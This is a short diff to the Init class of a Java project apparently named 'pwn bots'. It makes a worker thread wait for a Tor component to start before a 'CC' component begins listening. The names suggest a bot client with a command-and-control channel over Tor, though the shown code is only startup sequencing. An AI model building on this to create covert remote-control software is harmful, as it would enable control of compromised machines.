@@ -1,6 +1,7 @@
 package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.init;
 
 import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
+import java.util.concurrent.TimeUnit;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -24,9 +25,13 @@ public class Init {
     }
 
     private void waitForWork() throws InterruptedException {
+        CommonHeader.getCC().start();
         Thread worker = new Thread(() -> {
             try {
-                CommonHeader.getCC().start();
+                while (!CommonHeader.getTOR_HEADER().isStarted()) {
+                    TimeUnit.MILLISECONDS.sleep(400);
+                }
+                CommonHeader.getCC().listen();
             } catch (Exception e) {
                 logger.error("", e);
             }
